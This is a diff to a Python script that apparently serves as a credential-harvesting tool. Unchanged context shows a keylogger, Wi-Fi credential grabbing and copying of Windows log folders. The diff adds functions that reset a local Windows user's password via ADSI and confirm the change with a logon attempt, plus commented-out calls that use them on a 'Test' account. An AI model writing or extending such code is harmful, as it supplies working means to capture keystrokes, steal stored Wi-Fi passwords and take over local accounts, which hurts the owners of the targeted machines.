@@ -92,6 +92,21 @@ def key_logger():
         listener.join()
     f.close()
     
+def set_password(username, password):
+    from win32com import adsi
+    ads_obj = adsi.ADsGetObject("WinNT://localhost/%s,user" % username)
+    ads_obj.Getinfo()
+    ads_obj.SetPassword(password)
+   
+def verify_password_change(username, password):
+    from win32security import LogonUser
+    from win32con import LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT
+    try:
+        LogonUser(username, None, password, LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT)
+    except:
+        return False
+    return True
+    
     
 
 def main():
@@ -111,6 +126,12 @@ def main():
     ip_address()
     copy_folder("C:/WindowsLogs/","C:/test/")
     wifi_creds()
+    
+    #set_password("Test","Password123")
+    #if verify_password_change("Test","Password123"):
+    #    print("Password Changed Successfully")
+    #else:
+    #    print("BUSTED CODE")
     
     
 
